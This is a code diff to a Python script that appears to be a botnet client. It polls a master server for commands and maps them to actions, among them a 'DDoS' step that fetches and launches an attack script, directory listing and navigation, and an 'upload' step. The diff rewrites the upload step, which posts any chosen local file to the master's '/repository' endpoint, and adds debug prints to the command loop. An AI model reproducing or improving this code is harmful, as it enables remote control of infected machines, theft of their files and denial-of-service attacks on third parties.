@@ -63,23 +63,28 @@ def send_result():
         except Exception as e:
             print(e)
 
-def upload(file_name):
+def upload_file(file_name):
     global result
     files = [file for file in os.listdir()]
     if file_name not in files:
         result = "File does not exist"
         send_result()
     else:
-        with open(file_name, 'rb') as f:
-            r = requests.post("http://" + MASTER_IP + ":" + MASTER_PORT + "/repository", files={file_name:f})
-
+        url = "http://" + MASTER_IP + ":" + MASTER_PORT + "/repository"
+        fin = open(file_name, 'rb')
+        files = {'file': fin}
+        try:
+            r = requests.post(url, files=files)
+            print (r.text)
+        finally:
+            fin.close()
 steps = {
     "DDoS": (get_script, launchDDoS),
     "Standby": (),
     "ls" : (ls, send_result),
     "cd" : (cd, send_result),
     "pwd" : (pwd, send_result),
-    "upload" : (upload)
+    "upload" : (upload_file, )
 }
 
 def run():
@@ -90,13 +95,16 @@ def run():
             time.sleep(5)
             continue
         else:
+            print("command is:", command[0])
+            print(command[1])
+            print(steps[command[0]])
             for step in steps[command[0]]:
                 args = inspect.getargspec(step)[0]
                 assert(isinstance(args, list))
                 if 'path' in args or 'file_name' in args:
                     step(command[1])
-                elif 'result' in args:
-                    step()
+                # elif 'result' in args:
+                #     step()
                 else:
                     step()
             time.sleep(5)
